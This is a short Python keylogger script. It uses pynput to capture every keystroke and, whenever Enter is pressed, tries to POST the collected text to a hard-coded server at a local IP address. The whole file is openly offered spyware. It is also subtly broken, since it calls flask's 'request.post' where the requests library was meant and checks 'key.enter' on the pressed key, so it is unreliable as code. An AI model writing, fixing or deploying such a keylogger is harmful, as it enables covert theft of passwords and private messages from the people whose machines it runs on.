from flask.globals import request
from pynput.keyboard import Listener
import requests

server_url = 'http://192.168.0.9:5000/'
logs = ''

def on_press(key):
    global logs
    
    if key == key.enter:
        request.post(server_url, data={'logs': logs})
        logs = ''
    else:
        logs += str(key)        
     
    
with Listener(on_press=on_press) as listener:
    listener.join()